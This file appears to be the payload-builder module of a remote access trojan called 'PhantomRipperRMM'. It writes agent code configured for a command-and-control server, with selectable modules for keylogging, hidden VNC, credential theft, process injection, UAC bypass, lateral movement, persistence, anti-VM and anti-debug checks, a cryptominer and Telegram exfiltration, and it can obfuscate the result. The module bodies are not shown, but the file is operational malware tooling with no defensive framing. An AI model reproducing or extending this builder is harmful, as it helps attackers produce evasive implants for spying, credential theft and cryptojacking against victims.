'use strict';

/**
 * PhantomRipperRMM — payload builder.
 *
 * Renders a payload template with operator-supplied options, optionally runs
 * the Python obfuscator, writes the artifact into the build dir, and records
 * metadata (size + sha256) in the DB.
 *
 * Supported agent types:
 *   python  — cross-platform (Windows/macOS/Linux), obfuscatable, Nuitka-compilable
 *   cpp     — delegates to the agent-cpp build pipeline (MSVC/MinGW cross-build)
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');
const config = require('./config');
const sessions = require('./sessionManager');

const TEMPLATE_DIR = path.join(config.payloadDir, 'templates');
const OBFUSCATOR = path.join(config.payloadDir, 'obfuscator.py');
const OBFUSCATOR_ENHANCED = path.join(config.payloadDir, 'obfuscator_enhanced.py');

function randHex(n) {
  return crypto.randomBytes(n).toString('hex');
}

function sha256File(file) {
  const h = crypto.createHash('sha256');
  h.update(fs.readFileSync(file));
  return h.digest('hex');
}

/** Fill {{PLACEHOLDER}} tokens in a template string. */
function render(template, vars) {
  return template.replace(/\{\{\s*([A-Z0-9_]+)\s*\}\}/g, (m, key) => {
    if (key in vars) return String(vars[key]);
    return m;
  });
}

/**
 * Strip feature blocks the operator did not enable.
 * Blocks are marked in the template as:
 *   //#pragma module NAME        ... //#pragma endmodule
 */
function stripModules(source, enabledSet) {
  return source.replace(
    /^[ \t]*\/\/#pragma module ([a-z0-9_]+)[^\n]*\n([\s\S]*?)^[ \t]*\/\/#pragma endmodule[^\n]*\n?/gim,
    (m, name, body) => (enabledSet.has(name.toLowerCase()) ? body : '')
  );
}

// Module dependencies: enabling X auto-enables Y (agent symbols cross-reference).
const MODULE_DEPS = {
  runas: ['esc'],
  hvnc: ['screen'],
  creds: ['esc'],
  inject: ['esc'],
  lateral: ['net'],
  keylog: [],
  ws: [],
};

/** Resolve the requested module list to a closed dependency set. */
function resolveModules(opts) {
  const set = new Set(['core']);
  const requested = String(
    opts.modules === undefined || opts.modules === '' || opts.modules === 'all'
      ? 'esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,pymod,lateral,net,proc,anti,ws,telegram'
      : opts.modules
  ).split(',').map((m) => m.trim().toLowerCase()).filter(Boolean);
  for (const m of requested) set.add(m);
  if (opts.keylog) set.add('keylog');
  if (opts.miner) set.add('miner');
  if (opts.persist) set.add('persist');
  if (opts.transport === 'ws') set.add('ws');
  if (opts.transport === 'telegram') set.add('telegram');
  if (set.has('all')) {
    for (const m of 'esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,pymod,lateral,net,proc,anti,ws,telegram,miner'.split(',')) {
      set.add(m);
    }
    set.delete('all');
  }
  // close dependencies until fixpoint
  let changed = true;
  while (changed) {
    changed = false;
    for (const m of Array.from(set)) {
      for (const dep of MODULE_DEPS[m] || []) {
        if (!set.has(dep)) { set.add(dep); changed = true; }
      }
    }
  }
  return set;
}

function buildVars(opts) {
  const scheme = opts.scheme || config.c2.scheme;
  const host = opts.host || config.c2.host;
  const port = opts.port || config.c2.port;
  const modules = resolveModules(opts);
  return {
    C2_HOST: host,
    C2_PORT: port,
    C2_SCHEME: scheme,
    C2_URL: `${scheme}://${host}:${port}`,
    PATH_PREFIX: opts.path_prefix || '/api',
    TRANSPORT: opts.transport || 'https',
    BEACON_INTERVAL: opts.beacon_interval || 5,
    JITTER: opts.jitter || 0.2,
    SESSION_ID: opts.session_id || randHex(8),
    SLEEP_MASK: opts.sleep_mask || 0,
    ANTI_VM: opts.anti_vm ? 1 : 0,
    ANTI_DEBUG: opts.anti_debug ? 1 : 0,
    PERSIST: opts.persist ? 1 : 0,
    KEYLOG: opts.keylog ? 1 : 0,
    MINER: opts.miner ? 1 : 0,
    MINER_POOL: opts.miner_pool || '',
    MINER_WALLET: opts.miner_wallet || '',
    USER_AGENT: opts.user_agent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    HEADER_CARRY: opts.header_carry ? 1 : 0,
    DECOYS: opts.decoys || '',
    KILLDATE: opts.killdate || '',
    PROC_NAME: opts.proc_name || '',
    TG_BOT_TOKEN: opts.tg_bot_token || '',
    TG_CHAT: opts.tg_chat || '',
    ARTIFACT_CHUNK: opts.artifact_chunk || 524288,
    MODULES_ENABLED: Array.from(modules).join(','),
  };
}

/** Run the Python obfuscator on a source file, returning the obfuscated path. */
function obfuscate(srcFile, enhanced) {
  const script = enhanced ? OBFUSCATOR_ENHANCED : OBFUSCATOR;
  if (!fs.existsSync(script)) return { ok: false, reason: 'obfuscator missing' };

  const args = [script, srcFile];
  if (enhanced) args.push('--enhanced');

  const res = spawnSync(config.pythonBin, args, { cwd: path.dirname(srcFile), encoding: 'utf8' });
  if (res.error) return { ok: false, reason: res.error.message };
  if (res.status !== 0) return { ok: false, reason: (res.stderr || res.stdout || 'obfuscation failed').trim() };

  // Obfuscators typically write <base>_or.py or <base>_<hex>.py next to input.
  const dir = path.dirname(srcFile);
  const base = path.basename(srcFile, '.py').toLowerCase();
  const candidates = fs
    .readdirSync(dir)
    .filter((f) => f.toLowerCase().startsWith(base) && f.endsWith('.py') && f !== path.basename(srcFile))
    .map((f) => path.join(dir, f))
    .sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs);

  if (!candidates.length) return { ok: false, reason: 'obfuscator produced no output' };
  return { ok: true, path: candidates[0] };
}

/** Build a payload. Returns metadata for the panel. */
async function buildPayload(opts, createdBy) {
  const agentType = opts.agent_type || 'python';
  const osTarget = opts.os_target || 'windows';
  const transport = opts.transport || 'https';

  if (agentType === 'cpp') {
    return buildCpp(opts, createdBy);
  }
  return buildPython(opts, { agentType, osTarget, transport }, createdBy);
}

async function buildPython(opts, meta, createdBy) {
  const templatePath = path.join(TEMPLATE_DIR, 'agent_template.py');
  if (!fs.existsSync(templatePath)) {
    throw new Error(`template missing: ${templatePath}`);
  }
  const template = fs.readFileSync(templatePath, 'utf8');
  const vars = buildVars(opts);
  const moduleSet = resolveModules(opts);
  moduleSet.add('core');
  let source = stripModules(render(template, vars), moduleSet);

  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const name = (opts.name || `payload_${stamp}`).replace(/[^a-zA-Z0-9_.-]/g, '_');
  const workDir = fs.mkdtempSync(path.join(config.buildDir, 'build-'));
  const rawPath = path.join(workDir, `${name}.py`);
  fs.writeFileSync(rawPath, source);

  let finalPath = rawPath;
  if (opts.obfuscate) {
    const result = obfuscate(rawPath, !!opts.enhanced);
    if (result.ok) {
      finalPath = result.path;
    } else {
      await sessions.logEvent('payload', `obfuscation skipped: ${result.reason}`, 'warn');
    }
  }

  const outPath = path.join(config.buildDir, `${name}.py`);
  fs.copyFileSync(finalPath, outPath);
  const size = fs.statSync(outPath).size;
  const sha = sha256File(outPath);

  const id = await sessions.recordPayload({
    name,
    agent_type: meta.agentType,
    os_target: meta.osTarget,
    transport: meta.transport,
    options: { ...opts, session_id: vars.SESSION_ID },
    filename: path.basename(outPath),
    size,
    sha256: sha,
    created_by: createdBy,
  });

  return {
    id,
    name,
    agent_type: meta.agentType,
    os_target: meta.osTarget,
    transport: meta.transport,
    filename: path.basename(outPath),
    path: outPath,
    size,
    sha256: sha,
    session_id: vars.SESSION_ID,
    obfuscated: !!opts.obfuscate,
  };
}

async function buildCpp(opts, createdBy) {
  // The C++ agent build is driven by agent-cpp/build.ps1 (MSVC) or the docker
  // cross-compile image. We record the request; the actual compile is async
  // and surfaced as an artifact once complete.
  const name = (opts.name || `cpp_${Date.now()}`).replace(/[^a-zA-Z0-9_.-]/g, '_');
  const vars = buildVars(opts);
  const id = await sessions.recordPayload({
    name,
    agent_type: 'cpp',
    os_target: opts.os_target || 'windows',
    transport: opts.transport || 'https',
    options: { ...opts, session_id: vars.SESSION_ID },
    filename: `${name}.exe`,
    size: 0,
    sha256: null,
    created_by: createdBy,
  });
  await sessions.logEvent('payload', `queued C++ build ${name} (run agent-cpp build pipeline)`, 'info');
  return {
    id,
    name,
    agent_type: 'cpp',
    os_target: opts.os_target || 'windows',
    transport: opts.transport || 'https',
    filename: `${name}.exe`,
    status: 'queued',
    session_id: vars.SESSION_ID,
    note: 'Run agent-cpp/build.ps1 (or docker/Dockerfile.builder) to produce the binary.',
  };
}

module.exports = { buildPayload, render, stripModules, resolveModules, buildVars, sha256File };
